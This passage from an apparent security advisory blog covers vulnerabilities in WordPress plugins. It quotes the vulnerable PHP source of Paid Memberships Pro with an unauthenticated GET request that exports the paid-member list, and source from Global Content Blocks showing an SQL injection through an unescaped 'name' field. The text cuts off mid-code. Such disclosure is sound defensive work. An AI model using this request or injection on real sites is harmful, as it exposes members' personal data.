class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0035 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/symposium/" rel="tag">Symposium</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/#respond" title="Comment on WordPress Symposium plugin multiple stored XSS vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-26 -->

				
					
<article id="post-56" class="post-56 post type-post status-publish format-standard hentry category-advisories tag-paid-memberships-pro tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/" title="5:24 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-13T17:24:39+00:00" pubdate>July 13, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/" title="Permalink to WordPress Paid Memberships Pro information disclosure vulnerability" rel="bookmark">WordPress Paid Memberships Pro information disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49630/">Secunia Advisory SA 49630</a></p>
<p><strong>Analysis of vulnerability</strong><br />
The page <a href="http://plugins.svn.wordpress.org/paid-memberships-pro/tags/1.4.8/adminpages/memberslist-csv.php">/adminpages/memberslist-csv.php</a> is called through AJAX from admin pages, in order to export a CSV list of paid members on the WordPress site. It sets itself up like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f275c8193922430" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//this file is launched via AJAX to get various data from the DB for the stranger_products plugin

//wp includes
define('WP_USE_THEMES', false);
require('../../../../wp-load.php');

//get users	
if(isset($_REQUEST['s']))
	$s = $_REQUEST['s'];
else
	$s = "";

if(isset($_REQUEST['l']))
	$l = $_REQUEST['l'];
else
	$l = false;

//some vars for the search
if(!empty($_REQUEST['pn']))
	$pn = $_REQUEST['pn'];
else
	$pn = 1;

if(!empty($_REQUEST['limit']))
	$limit = $_REQUEST['limit'];
else
	$limit = false;

if($limit)
{	
	$end = $pn * $limit;
	$start = $end - $limit;		
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-2">2</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-4">4</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-6">6</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-8">8</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-10">10</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-12">12</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-14">14</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-16">16</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-18">18</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-20">20</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-22">22</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-24">24</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-26">26</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-28">28</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-30">30</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275c8193922430-32">32</div><div class="crayon-num" data-line="crayon-53c9878f275c8193922430-33">33</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f275c8193922430-1"><span class="crayon-c">//this file is launched via AJAX to get various data from the DB for the stranger_products plugin</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f275c8193922430-3"><span class="crayon-c">//wp includes</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-4"><span class="crayon-e">define</span><span class="crayon-sy">(</span><span class="crayon-s">'WP_USE_THEMES'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-5"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f275c8193922430-7"><span class="crayon-c">//get users&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-8"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'s'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'s'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-10"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-12">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f275c8193922430-13"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'l'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'l'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-15"><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-17">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-18"><span class="crayon-c">//some vars for the search</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-19"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">empty</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'pn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'pn'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-21"><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">pn</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-24"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">empty</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'limit'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">limit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'limit'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-26"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">limit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-28">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f275c8193922430-29"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-30"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-e ">pn *</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275c8193922430-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">limit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f275c8193922430-33"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0066 seconds] -->
<p>Due to a lack of validation that the user is logged in and has sufficient rights to do so, we can simply request this page and get a full list of paid members on the blog.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f275d6766094000" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/paid-memberships-pro/adminpages/memberslist-csv.php HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f275d6766094000-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f275d6766094000-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f275d6766094000-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">paid</span><span class="crayon-o">-</span><span class="crayon-i">memberships</span><span class="crayon-o">-</span><span class="crayon-i">pro</span><span class="crayon-o">/</span><span class="crayon-i">adminpages</span><span class="crayon-o">/</span><span class="crayon-i">memberslist</span><span class="crayon-o">-</span><span class="crayon-v">csv</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f275d6766094000-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/paid-memberships-pro/" rel="tag">Paid Memberships Pro</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/#respond" title="Comment on WordPress Paid Memberships Pro information disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-56 -->

				
					
<article id="post-37" class="post-37 post type-post status-publish format-standard hentry category-advisories tag-global-content-blocks tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="12:01 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-12T12:01:22+00:00" pubdate>July 12, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="Permalink to WordPress Global Content Blocks multiple vulnerabilities" rel="bookmark">WordPress Global Content Blocks multiple vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49854/">Secunia Advisory SA 49854</a></p>
<p><strong>Analysis of gcb_ajax_add.php vulnerability</strong><br />
A part of the admin interface for this plugin allows you to insert a &#8220;content block&#8221;, which can be used across WordPress to contain reusable blocks of content and PHP code. It does so by making a POST call to <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcb_ajax_add.php">/resources/tinymce/gcd_ajax_add.php</a>. Let&#8217;s have a quick look at that to see how it works.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f27ae8477304623" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../../../../../wp-load.php');
global $wpdb;

if(!isset($_POST["name"]) || !isset($_POST["content"])) {die("invalid call!");}

$name = $_POST["name"];
$description = mysql_real_escape_string(htmlspecialchars($_POST['description']));
$type = mysql_real_escape_string(htmlspecialchars($_POST['type']));
$value = mysql_real_escape_string(htmlspecialchars($_POST['content']));

if(!strlen($name) || !strlen($value)) {die("invalid call!");}

$available_types = array(
            "other"=&gt;array("vname"=&gt;"General","img"=&gt;"gcb.png","help"=&gt;"Content block"),
            "adsense"=&gt;array("vname"=&gt;"Adsense","img"=&gt;"adsense.png","help"=&gt;"Adsense code"),
            "code"=&gt;array("vname"=&gt;"Code","img"=&gt;"code.png","help"=&gt;"Programming code"),
            "form"=&gt;array("vname"=&gt;"Form","img"=&gt;"form.png","help"=&gt;"General form"),
            "html"=&gt;array("vname"=&gt;"HTML","img"=&gt;"html.png","help"=&gt;"Raw HTML code"),
            "iframe"=&gt;array("vname"=&gt;"Iframe","img"=&gt;"iframe.png","help"=&gt;"Iframe code"),
            "optin"=&gt;array("vname"=&gt;"Opt-In Form","img"=&gt;"optin.png","help"=&gt;"Opt-In form code"),
            "php"=&gt;array("vname"=&gt;"PHP Code","img"=&gt;"php.png","help"=&gt;"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"),
        );

$wpdb-&gt;query("insert into ".$wpdb-&gt;prefix . "gcb (name,description,value,type) VALUES ('".$name."','".$description."','".$value."','".$type."')");

$inserted_id = mysql_insert_id();

$return = array(
"id"=&gt;$inserted_id,
"name"=&gt;$name,
"img"=&gt;$available_types[$type]["img"]
);

echo json_encode($return);die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-2">2</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-4">4</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-6">6</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-8">8</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-10">10</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-12">12</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-14">14</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-16">16</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-18">18</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-20">20</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-22">22</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-24">24</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-26">26</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-28">28</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-30">30</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-32">32</div><div class="crayon-num" data-line="crayon-53c9878f27ae8477304623-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f27ae8477304623-34">34</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f27ae8477304623-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-2"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"content"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-6"><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f27ae8477304623-7"><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'description'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f27ae8477304623-8"><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'type'</span><span class="crayon-sy">]</span><span 